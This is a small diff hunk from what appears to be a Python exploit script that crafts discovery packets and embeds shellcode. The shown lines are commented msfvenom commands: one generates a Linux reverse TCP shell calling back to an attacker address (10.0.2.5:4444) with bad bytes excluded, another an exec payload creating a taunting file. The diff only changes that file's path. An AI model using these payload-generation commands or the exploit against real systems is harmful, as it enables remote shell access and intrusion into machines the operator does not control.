@@ -77,7 +77,7 @@ def gen_discover_packet(ad_id, os, hn, user, inf, func):
 
 
 # msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.2.5 LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
-# msfvenom -p linux/x64/exec CMD='touch /Desktop/youarefucked.txt' -b "\x00\x25\x26" -f python -v shellcode
+# msfvenom -p linux/x64/exec CMD='touch ./youarefucked.txt' -b "\x00\x25\x26" -f python -v shellcode
 # msfvenom -p ...linux...http...exec... -b "\x00\x25\x26" -f python -v shellcode
 
 shellcode =  b""
